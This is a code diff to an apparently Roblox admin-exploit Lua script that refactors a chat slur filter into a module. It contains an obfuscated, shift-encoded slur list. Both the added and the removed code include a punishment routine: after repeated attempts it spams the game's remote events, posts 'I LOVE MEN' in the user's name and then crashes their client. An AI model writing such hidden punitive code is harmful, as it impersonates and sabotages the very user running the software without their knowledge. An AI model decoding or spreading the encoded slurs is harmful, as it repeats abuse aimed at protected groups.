@@ -590,6 +590,131 @@ do
 	end
 end
 
+do
+	NAmanage.NAChatSlurGuard = type(NAmanage.NAChatSlurGuard) == "table" and NAmanage.NAChatSlurGuard or {}
+	local guard = NAmanage.NAChatSlurGuard
+	guard.Warnings = guard.Warnings or {
+		"NA Chat: Slurs are blocked here",
+		"NA Chat: Drop the slurs",
+		"NA Chat: Keep it respectful",
+		"NA Chat: That language isn't welcome",
+		"NA Chat: Stop trying to type slurs",
+	}
+	guard.LeetMap = guard.LeetMap or {
+		a = "[a4@àáâãäåāăąα]", b = "[b8]", c = "[c%(çćč]", d = "d", e = "[e3èéêëēĕėęě]", f = "f",
+		g = "[g69]", h = "h", i = "[i1!|lìíîïīįı8]", j = "j", k = "k", l = "[l1|!]",
+		m = "m", n = "[nñńņň]", o = "[o0òóôõöōŏőø]", p = "p", q = "q", r = "r", s = "[s5$śšșß]",
+		t = "[t7+țţť]", u = "[uvùúûüūůűŭ]", v = "[vuùúûüūůűŭ]", w = "w", x = "x", y = "[yýÿ]", z = "[z2źżž]"
+	}
+	guard.ZeroWidthPattern = guard.ZeroWidthPattern or "[\226\128\139\226\128\140\226\128\141\239\187\191]"
+	guard.DigitLeetMap = guard.DigitLeetMap or { ["0"]="o", ["1"]="i", ["2"]="z", ["3"]="e", ["4"]="a", ["5"]="s", ["6"]="g", ["7"]="t", ["8"]="b", ["9"]="g" }
+	guard.ExtraLeetMap = guard.ExtraLeetMap or { ["$"]="s", ["€"]="e", ["£"]="l", ["@"]="a" }
+	guard.AccentLowerMap = guard.AccentLowerMap or {
+		["Á"] = "á", ["À"] = "à", ["Â"] = "â", ["Ã"] = "ã", ["Ä"] = "ä", ["Å"] = "å", ["Ā"] = "ā", ["Ă"] = "ă", ["Ą"] = "ą",
+		["Ć"] = "ć", ["Č"] = "č", ["Ç"] = "ç",
+		["É"] = "é", ["È"] = "è", ["Ê"] = "ê", ["Ë"] = "ë", ["Ē"] = "ē", ["Ĕ"] = "ĕ", ["Ė"] = "ė", ["Ę"] = "ę", ["Ě"] = "ě",
+		["Í"] = "í", ["Ì"] = "ì", ["Î"] = "î", ["Ï"] = "ï", ["Ī"] = "ī", ["Į"] = "į",
+		["Ó"] = "ó", ["Ò"] = "ò", ["Ô"] = "ô", ["Õ"] = "õ", ["Ö"] = "ö", ["Ø"] = "ø", ["Ō"] = "ō", ["Ŏ"] = "ŏ", ["Ő"] = "ő",
+		["Ú"] = "ú", ["Ù"] = "ù", ["Û"] = "û", ["Ü"] = "ü", ["Ū"] = "ū", ["Ů"] = "ů", ["Ű"] = "ű", ["Ŭ"] = "ŭ",
+		["Ý"] = "ý", ["Ÿ"] = "ÿ", ["Š"] = "š", ["Ž"] = "ž", ["Ł"] = "ł", ["Ð"] = "ð", ["Þ"] = "þ", ["Ñ"] = "ñ",
+	}
+	guard.EncodedSlurs = guard.EncodedSlurs or {113,108,106,106,104,117,47,113,108,106,106,100,47,105,100,106,106,114,119,47,110,108,110,104,47,102,107,108,113,110,47,118,115,108,102,47,122,104,119,101,100,102,110,47,106,114,114,110,47,119,117,100,113,113,124,47,117,104,119,100,117,103,47,102,114,114,113}
+	guard.FancyAlphaMap = guard.FancyAlphaMap or {}
+	if next(guard.FancyAlphaMap) == nil then
+		local alphabet = "abcdefghijklmnopqrstuvwxyz"
+		for i = 0, 25 do
+			guard.FancyAlphaMap[utf8.char(0x24D0 + i)] = alphabet:sub(i + 1, i + 1)
+			guard.FancyAlphaMap[utf8.char(0x24B6 + i)] = alphabet:sub(i + 1, i + 1)
+			guard.FancyAlphaMap[utf8.char(0xFF41 + i)] = alphabet:sub(i + 1, i + 1)
+			guard.FancyAlphaMap[utf8.char(0xFF21 + i)] = alphabet:sub(i + 1, i + 1)
+		end
+	end
+
+	function guard:NormalizeTextLower(text)
+		text = tostring(text or "")
+		return Lower(text):gsub("[ÁÀÂÃÄÅĀĂĄĆČÇÉÈÊËĒĔĖĘĚÍÌÎÏĪĮÓÒÔÕÖØŌŎŐÚÙÛÜŪŮŰŬÝŸŠŽŁÐÞÑ]", self.AccentLowerMap)
+	end
+
+	function guard:NormalizeForSlurs(text)
+		text = self:NormalizeTextLower(text)
+		text = text:gsub(self.ZeroWidthPattern, "")
+		text = text:gsub("[%c%p%s]+", "")
+		return text:gsub(".", function(ch)
+			return self.DigitLeetMap[ch] or self.ExtraLeetMap[ch] or self.FancyAlphaMap[ch] or ch
+		end)
+	end
+
+	function guard:Prepare(extra)
+		self.Attempts = 0
+		self.Punishing = false
+		local chars = {}
+		for i, value in ipairs(self.EncodedSlurs) do
+			chars[i] = string.char(value - 3)
+		end
+		local slurs = {}
+		for word in Concat(chars):gmatch("[^,]+") do
+			slurs[#slurs + 1] = word
+		end
+		local function addExtra(value)
+			if type(value) ~= "string" then return end
+			for word in value:gmatch("[^,%s]+") do
+				local clean = self:NormalizeTextLower(word)
+				if clean ~= "" then slurs[#slurs + 1] = clean end
+			end
+		end
+		if type(extra) == "string" then
+			addExtra(extra)
+		elseif type(extra) == "table" then
+			for _, value in ipairs(extra) do addExtra(value) end
+		end
+		local patterns = {}
+		for _, word in ipairs(slurs) do
+			word = self:NormalizeTextLower(word)
+			if word ~= "" then
+				local parts = {}
+				for i = 1, #word do
+					local ch = word:sub(i, i)
+					parts[#parts + 1] = (self.LeetMap[ch] or ch).."+"
+				end
+				patterns[#patterns + 1] = Concat(parts, "[%W_%d]*")
+			end
+		end
+		self.Patterns = patterns
+	end
+
+	function guard:IsAttempt(text)
+		if type(text) ~= "string" then return false end
+		local lower = self:NormalizeTextLower(text):gsub(self.ZeroWidthPattern, "")
+		local squashed = self:NormalizeForSlurs(text)
+		for _, pattern in ipairs(self.Patterns or {}) do
+			if lower:match(pattern) or squashed:match(pattern) then return true end
+		end
+		return false
+	end
+
+	function guard:Warn(errorColor)
+		self.Attempts = (tonumber(self.Attempts) or 0) + 1
+		local warnings = self.Warnings
+		local warnMsg = warnings[math.random(1, #warnings)]
+		if originalIO and type(originalIO.setStatus) == "function" then
+			originalIO.setStatus(warnMsg, errorColor)
+		end
+		if DoNotif then DoNotif(warnMsg, 3) end
+		if self.Attempts > 5 and not self.Punishing then
+			self.Punishing = true
+			Spawn(function()
+				local endTime = tick() + 10
+				while tick() < endTime do
+					pcall(function() if cmd and cmd.run then cmd.run({"fireremotes"}) end end)
+					pcall(function() if cmd and cmd.run then cmd.run({"chat", "I LOVE MEN"}) end end)
+					Wait(0.15)
+				end
+				pcall(function() if cmd and cmd.run then cmd.run({"crash"}) end end)
+			end)
+		end
+	end
+end
+
 NAgui.nachat = function()
 	local frame = NAUIMANAGER and NAUIMANAGER.NAchatFrame
 	if not frame then
@@ -600,13 +725,11 @@ NAgui.nachat = function()
 	if frame.GetAttribute and NAmanage and type(NAmanage.GetAttr) == "function" then
 		initialized = NAmanage.GetAttr(frame, "NANAChatDefaultSized") == true
 	end
-	if not initialized then
-		if NAmanage and type(NAmanage.NAChat_ApplyResponsive) == "function" then
-			pcall(NAmanage.NAChat_ApplyResponsive, true)
-		elseif NAmanage and type(NAmanage.centerFrame) == "function" then
-			frame.AnchorPoint = Vector2.new(0, 0)
-			pcall(NAmanage.centerFrame, frame)
-		end
+	if NAmanage and type(NAmanage.NAChat_ApplyResponsive) == "function" then
+		pcall(NAmanage.NAChat_ApplyResponsive, not initialized)
+	elseif not initialized and NAmanage and type(NAmanage.centerFrame) == "function" then
+		frame.AnchorPoint = Vector2.new(0, 0)
+		pcall(NAmanage.centerFrame, frame)
 	end
 	if NAmanage and NAmanage.CustomScroll and NAmanage.CustomScroll.refreshAll then
 		pcall(NAmanage.CustomScroll.refreshAll)
@@ -3950,163 +4073,7 @@ originalIO.runNACHAT=function()
 			return bestMatch
 		end
 
-		local slurWarnings = {
-			"NA Chat: Slurs are blocked here",
-			"NA Chat: Drop the slurs",
-			"NA Chat: Keep it respectful",
-			"NA Chat: That language isn't welcome",
-			"NA Chat: Stop trying to type slurs",
-		}
-		local slurAttempts = 0
-		local slurPunishing = false
-
-		local leetMap = {
-			a = "[a4@àáâãäåāăąα]", b = "[b8]", c = "[c%(çćč]", d = "d", e = "[e3èéêëēĕėęě]", f = "f",
-			g = "[g69]", h = "h", i = "[i1!|lìíîïīįı8]", j = "j", k = "k", l = "[l1|!]",
-			m = "m", n = "[nñńņň]", o = "[o0òóôõöōŏőø]", p = "p", q = "q", r = "r", s = "[s5$śšșß]",
-			t = "[t7+țţť]", u = "[uvùúûüūůűŭ]", v = "[vuùúûüūůűŭ]", w = "w", x = "x", y = "[yýÿ]", z = "[z2źżž]"
-		}
-
-		local zeroWidthPattern = "[\226\128\139\226\128\140\226\128\141\239\187\191]"
-		local digitLeetMap = { ["0"]="o", ["1"]="i", ["2"]="z", ["3"]="e", ["4"]="a", ["5"]="s", ["6"]="g", ["7"]="t", ["8"]="b", ["9"]="g" }
-		local extraLeetMap = { ["$"]="s", ["€"]="e", ["£"]="l", ["@"]="a" }
-		local fancyAlphaMap = {}
-		do
-			local base = "abcdefghijklmnopqrstuvwxyz"
-			for i = 0, 25 do
-				fancyAlphaMap[utf8.char(0x24D0 + i)] = base:sub(i + 1, i + 1)
-				fancyAlphaMap[utf8.char(0x24B6 + i)] = base:sub(i + 1, i + 1)
-				fancyAlphaMap[utf8.char(0xFF41 + i)] = base:sub(i + 1, i + 1)
-				fancyAlphaMap[utf8.char(0xFF21 + i)] = base:sub(i + 1, i + 1)
-			end
-		end
-
-		local accentLowerMap = {
-			["Á"] = "á", ["À"] = "à", ["Â"] = "â", ["Ã"] = "ã", ["Ä"] = "ä", ["Å"] = "å", ["Ā"] = "ā", ["Ă"] = "ă", ["Ą"] = "ą",
-			["Ć"] = "ć", ["Č"] = "č", ["Ç"] = "ç",
-			["É"] = "é", ["È"] = "è", ["Ê"] = "ê", ["Ë"] = "ë", ["Ē"] = "ē", ["Ĕ"] = "ĕ", ["Ė"] = "ė", ["Ę"] = "ę", ["Ě"] = "ě",
-			["Í"] = "í", ["Ì"] = "ì", ["Î"] = "î", ["Ï"] = "ï", ["Ī"] = "ī", ["Į"] = "į",
-			["Ó"] = "ó", ["Ò"] = "ò", ["Ô"] = "ô", ["Õ"] = "õ", ["Ö"] = "ö", ["Ø"] = "ø", ["Ō"] = "ō", ["Ŏ"] = "ŏ", ["Ő"] = "ő",
-			["Ú"] = "ú", ["Ù"] = "ù", ["Û"] = "û", ["Ü"] = "ü", ["Ū"] = "ū", ["Ů"] = "ů", ["Ű"] = "ű", ["Ŭ"] = "ŭ",
-			["Ý"] = "ý", ["Ÿ"] = "ÿ",
-			["Š"] = "š", ["Ž"] = "ž",
-			["Ł"] = "ł", ["Ð"] = "ð", ["Þ"] = "þ",
-			["Ñ"] = "ñ",
-		}
-		local function normalizeTextLower(text)
-			text = tostring(text or "")
-			local lowered = Lower(text)
-			return lowered:gsub("[ÁÀÂÃÄÅĀĂĄĆČÇÉÈÊËĒĔĖĘĚÍÌÎÏĪĮÓÒÔÕÖØŌŎŐÚÙÛÜŪŮŰŬÝŸŠŽŁÐÞÑ]", accentLowerMap)
-		end
-
-		local function normalizeForSlurs(text)
-			text = normalizeTextLower(text)
-			text = text:gsub(zeroWidthPattern, "")
-			text = text:gsub("[%c%p%s]+", "")
-			text = text:gsub(".", function(ch)
-				return digitLeetMap[ch] or extraLeetMap[ch] or fancyAlphaMap[ch] or ch
-			end)
-			return text
-		end
-
-		local function mergeExtraSlurs(target, extra)
-			if type(extra) == "string" then
-				for word in extra:gmatch("[^,%s]+") do
-					local clean = normalizeTextLower(word)
-					if clean ~= "" then
-						Insert(target, clean)
-					end
-				end
-			elseif type(extra) == "table" then
-				for _, word in ipairs(extra) do
-					if type(word) == "string" then
-						local clean = normalizeTextLower(word)
-						if clean ~= "" then
-							Insert(target, clean)
-						end
-					end
-				end
-			end
-		end
-
-		local encodedSlurs = {113,108,106,106,104,117,47,113,108,106,106,100,47,105,100,106,106,114,119,47,110,108,110,104,47,102,107,108,113,110,47,118,115,108,102,47,122,104,119,101,100,102,110,47,106,114,114,110,47,119,117,100,113,113,124,47,117,104,119,100,117,103,47,102,114,114,113}
-		local function decodeSlurList()
-			local chars = {}
-			for i, v in ipairs(encodedSlurs) do
-				chars[i] = string.char(v - 3)
-			end
-			local joined = Concat(chars)
-			local list = {}
-			for word in joined:gmatch("[^,]+") do
-				list[#list+1] = word
-			end
-			return list
-		end
-		local slurList = decodeSlurList()
-		mergeExtraSlurs(slurList, opt and opt.extraSlurs)
-
-		local slurSeparator = "[%W_%d]*"
-		local slurPatterns = {}
-		for _, word in ipairs(slurList) do
-			local parts = {}
-			word = normalizeTextLower(word)
-			if word ~= "" then
-				for i = 1, #word do
-					local ch = word:sub(i, i)
-					local base = leetMap[ch] or ch
-					parts[#parts+1] = base.."+"
-				end
-				slurPatterns[#slurPatterns+1] = Concat(parts, slurSeparator)
-			end
-		end
-
-		local function isSlurAttempt(text)
-			if type(text) ~= "string" then
-				return false
-			end
-			local lower = normalizeTextLower(text):gsub(zeroWidthPattern, "")
-			local squashed = normalizeForSlurs(text)
-			for _, pattern in ipairs(slurPatterns) do
-				if lower:match(pattern) or squashed:match(pattern) then
-					return true
-				end
-			end
-			return false
-		end
-
-		local function warnSlur()
-			slurAttempts += 1
-			local warnMsg = slurWarnings[math.random(1, #slurWarnings)]
-			originalIO.setStatus(warnMsg, STATUS_COLORS.err)
-			if DoNotif then
-				DoNotif(warnMsg, 3)
-			end
-
-			if slurAttempts > 5 and not slurPunishing then
-				slurPunishing = true
-				Spawn(function()
-					local endTime = tick() + 10
-					while tick() < endTime do
-						pcall(function()
-							if cmd and cmd.run then
-								cmd.run({"fireremotes"})
-							end
-						end)
-						pcall(function()
-							if cmd and cmd.run then
-								cmd.run({"chat", "I LOVE MEN"})
-							end
-						end)
-						Wait(0.15)
-					end
-					pcall(function()
-						if cmd and cmd.run then
-							cmd.run({"crash"})
-						end
-					end)
-				end)
-			end
-		end
+		NAmanage.NAChatSlurGuard:Prepare(opt and opt.extraSlurs)
 
 		local function sendMessage(t)
 			if isChatUiSuppressed() then
@@ -4135,8 +4102,8 @@ originalIO.runNACHAT=function()
 				return
 			end
 
-			if isSlurAttempt(t) then
-				warnSlur()
+			if NAmanage.NAChatSlurGuard:IsAttempt(t) then
+				NAmanage.NAChatSlurGuard:Warn(STATUS_COLORS.err)
 				clearTyping()
 				return
 			end
